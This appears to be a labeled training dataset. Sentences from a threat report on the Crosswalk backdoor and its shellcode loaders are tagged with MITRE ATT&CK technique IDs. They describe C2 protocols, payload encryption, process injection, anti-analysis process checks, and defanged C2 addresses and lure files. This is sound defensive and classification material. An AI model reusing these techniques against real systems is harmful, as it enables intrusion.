text,label
"Depending on which shortcut was opened, the output of ipconfig was sent to one of two addresses: http://goodhk.azurewebsites[.]net/inter.php or http://sixindent.epizy[.]com/inter.php.",T1071.001
Note that all three intermediate C2 servers are on third-level domains on a free hosting service.,T1090
"The main component connects to a C2 server, collects and sends system information, and contains functionality for installing and running up to 20 additional modules received from the server as shellcode.",T1005
The information collected by the module includes: OS uptime Network adapter IP addresses MAC address of one of the adapters Operating system version and whether it is 32-bit or 64-bit Username Computer name Name of running module PID Shellcode version and whether it is 32-bit or 64-bit (The shellcode supports both 32 and 64 bits.),"T1033, T1016, T1082"
The network configuration for this particular sample is at the end of the shellcode and is XOR encrypted with a 16-byte key.,T1027
"Then, one after the other, it tries combinations of possible proxy servers (any indicated in the configuration plus system proxies) and C2 servers until it connects successfully.",T1090
"The communication protocol used between the backdoor and C2 server can be separated logically into two levels: Application-level protocol Transport-level protocol On the application level, messages consist of the following fields: FakeTLS header consisting of 5 bytes: Entry type and protocol version (3 bytes).","T1095, T1071.001"
"For all subsequent messages, the content (not including the FakeTLS header) is transferred in the corresponding encrypted session key. AES-128 is the encryption algorithm used.",T1573.001
Four protocols are supported: Standard TCP connection Application-level messages are sent unchanged as TCP segments.,T1095
Equivalent to HTTP Long Polling The client creates two TCP connections.,T1095
"During the first connection, a GET request is sent to the C2 server.",T1071.001
The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response.,T1071.001
"After receipt of a response with code 200, subsequent messages from the client to the server are sent using separate POST requests.",T1071.001
Second HTTP connection with C2 Duplication of socket with TLS connection The client establishes a TCP connection and sends an HTTPS request like the following one: GET /msdn.cpp HTTP/1.1 Connection: Keep-Alive User-Agent: WinHTTP/1.1 Content-Length: 4294967295 Host:,"T1095, T1071.001"
Subsequent messages are exchanged in the original TCP connection (without TLS encryption).,T1095
Additional packets with FakeTLS header KCP protocol This protocol can be implemented on top of any other protocol (including UDP) to ensure quick and reliable data transfer.,T1095
The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments.,T1095
We can categorize these objects into two groups: local shellcode loaders and injectors.,T1055
Some of the samples in both groups are also obfuscated with VMProtect.,T1027
"Code for injecting shellcode into a running processThe injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it.","T1106, T1057, T1055"
"The samples we found contain one of three payloads: Crosswalk Metasploit stager FunnySwitch (discussed later in this report) Crosswalk and FunnySwitch shellcode is located in the data sections ""as-is,"" while the samples with Metasploit show additional XOR encryption with the key ""jj1"".",T1027
2.2 Local shellcode loaders The main function of the malware is to extract shellcode and run it in an active process.,"T1055, T1140"
"Code of the loader's main functionAfter the malware finds the API functions it needs, it decrypts the string Global\0EluZTRM3Kye4Hv65IGfoaX9sSP7VA with the ChaCha20 algorithm.","T1106, T1140"
"String ""CSPELOADKISSYOU"" in data sectionIn the self-contained loaders, the shellcode is located in a PE file overlay.",T1027
"The shellcode is stored in a curious way: data starts from 0x60 bytes of the header, followed by the (encrypted) shellcode.",T1027
The other header data is used for decryption: a 32-byte key is located at offset 0x28 and a 12-byte nonce for the ChaCha20 algorithm is at offset 0x50.,T1140
Handling of PL shellcode in the loader body (ChaCha20)The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.,"T1027, T1106"
"We can also find key information here in the structure of the PL shellcode: at offset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.",T1027
Handling of PL shellcode in the loader body (AES-128)Older loader versions use Cryptography API:,T1106
They use AES-128 in CFB mode as the encryption algorithm.,T1027
The name depends on the specific sample and is encrypted with the algorithm used in it.,T1027
"Building the file name with PL shellcodeAmong all the loaders, we encountered three different shellcode payloads: Crosswalk Metasploit stager Cobalt Strike Beacon 2.3 Attack examples 2.3.1 An encrypted resume This malicious file is a RAR archive, electronic_resume.pdf.rar (025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596), with two files: Figure 20.",T1027
"Configuration of Cobalt Strike BeaconThe archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.]186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar.",T1105
The same IP address was used as C2 server.,T1071.001
2.3.2 I can't breathe The attack is practically identical to the previous one: malware is distributed in a RAR archive video.rar (fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc) and consists of two .exe files.,T1027
"Chat transcript The archive запись чата.7z (""chat transcript.7z"") (e0b675302efc8c94e94b400a67bc627889bfdebb4f4dffdd68fdbc61d4cd03ae) contains three identical executable files with names resembling ""запись чата-1.png____________________________________.exe"" (""chat transcript-1.png____________________________________.exe"") in attacks again targeting Russian-speaking users.",T1027
"Its configuration implies three ways to connect to the C2 server at 149.28.23[.]32: Transport protocol 3, port 8443 Transport protocol 2, port 80 Transport protocol 1, port 8080 Figure 25.",T1095
"The attack is based on the archive Resume.rar (4d3ad3ff281a144d9a0a8ae5680f13e201ce1a6ba70e53a74510f0e41ae6a9e6), which contains just one file: CV.chm. Running the file without security updates installed causes two windows to appear simultaneously: CHM help in HTML Help and a PDF document.",T1027
Reference to pass.js in HTML codeThe script uses a technique for running an arbitrary command in a CHM file via an ActiveX object.,T1055
"This unpacks an HTML help file to the folder C:\Users\Public for launching the next stage of the infection: the file resume.exe, which is also embedded inside the CHM file.","T1027, T1140, T1036.005"
Current processes are checked and the malware will not run if any of the following are active: ollydbg.exe|ProcessHacker.exe|Fiddler.exe|windbg.exe|tcpview.exe|idaq.exe|idaq64.exe|tcpdump.exe|Wireshark.exe.,T1057
Main function in resume.exeMyResume.pdf is unpacked from the CHM file.,"T1027, T1140"
"If the user opens it directly, a message warns that the document is password-protected.",T1204.002
"MyResume.pdf, as viewed in Adobe Acrobat ReaderCompared to the PL shellcode, the data structure is more complex and contains the following:",T1027
"ROR-13 hash of data starting from byte 0x24 (0x20, 4 bytes) Nonce for algorithm ChaCha20 (0x24, 12 bytes) ChaCha20-encrypted text (0x30): Name of PDF file (+0x0)",T1027
"Size of PDF file (+0x20) Size of auxiliary shellcode (+0x24) Size of main shellcode (+0x28) Constant 0xE839E900 (+0x2C) PDF file Auxiliary shellcode Main shellcode On first launch of resume.exe, the encrypted portion of the data is decrypted (the key is hard-coded in the executable) and three sections are extracted (PDF, auxiliary shellcode, and main shellcode).","T1027, T1140"
"resume.exe: actions on first launchThe payload runs in a new process %windir%\System32\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.]98.",T1055
"Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe.",T1106
